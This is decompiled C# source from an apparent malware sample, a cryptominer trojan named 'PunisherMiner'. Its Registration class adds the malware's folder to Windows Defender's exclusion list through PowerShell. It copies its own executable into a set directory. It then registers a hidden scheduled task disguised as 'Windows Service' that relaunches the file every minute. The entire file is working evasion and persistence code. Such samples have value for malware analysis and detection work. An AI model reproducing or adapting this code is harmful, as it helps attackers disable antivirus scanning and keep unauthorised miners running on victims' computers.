// Decompiled with JetBrains decompiler
// Type: Registration
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System.Diagnostics;
using System.IO;
using System.Reflection;

public class Registration
{
  public void AddToDefender() => Starter.StartProcess("powershell.exe", "Add-MpPreference -ExclusionPath '" + Settings.Dirtectory + "' ");

  public void CopyFile()
  {
    string dirtectory = Settings.Dirtectory;
    string file = Settings.File;
    try
    {
      if (!Directory.Exists(dirtectory))
        Directory.CreateDirectory(dirtectory);
      if (File.Exists(dirtectory + "\\" + file))
        return;
      File.Copy(Assembly.GetExecutingAssembly().Location, dirtectory + "\\" + file);
    }
    catch
    {
    }
  }

  public void CreateTask()
  {
    string dirtectory = Settings.Dirtectory;
    string file = Settings.File;
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = "schtasks.exe",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/create /sc MINUTE /mo 1 /tn \"Windows Service\" /tr \"" + dirtectory + "\\" + file + "\" /f"
      });
    }
    catch
    {
    }
  }
}
